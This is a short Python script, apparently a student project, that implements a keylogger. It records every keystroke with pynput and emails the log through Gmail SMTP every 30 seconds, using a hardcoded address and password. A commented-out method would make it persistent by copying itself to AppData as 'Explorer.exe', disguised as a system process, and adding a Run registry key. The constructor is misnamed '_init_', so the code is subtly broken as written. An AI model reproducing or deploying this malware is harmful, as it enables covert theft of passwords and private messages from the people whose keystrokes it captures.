import sys
import subprocess
import pynput.keyboard
import smtplib
import threading
import os
import shutil


class Keylogger:

    def _init_(self, time_interval, email, password):
        # constructor
        self.logger = " Keylogger Testing"
        self.subject = "Key Logs"
        self.email = email
        self.password = password
        self.interval = time_interval

    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike

    def evaluate_keys(self, key):
        try:
            Pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                Pressed_key = " "
            elif key == key.enter:
                Pressed_key = "\n"
            else:
                Pressed_key = " " + str(key) + " "

        self.append_to_log(Pressed_key)

    def report(self):
        self.send_mail(self.email, self.password, self.subject, self.logger)
        self.logger = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, subject, message):
        Email_message = 'Subject: {}\n\n{}'.format(subject, message)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, Email_message)
        server.quit()

    #  def add_registry(self):
    #
    #     keylogger_location = os.environ["appdata"] + "\\Explorer.exe"
    #     if not os.path.exists(keylogger_location):
    #        shutil.copyfile(sys.executable, keylogger_location)
    #        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v explorer /t REG_SZ /d "' + keylogger_location + '"', shell=True)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


my_keylogger = Keylogger(30, "majorprojectmail7@gmail.com", "Asus@123")
my_keylogger.start()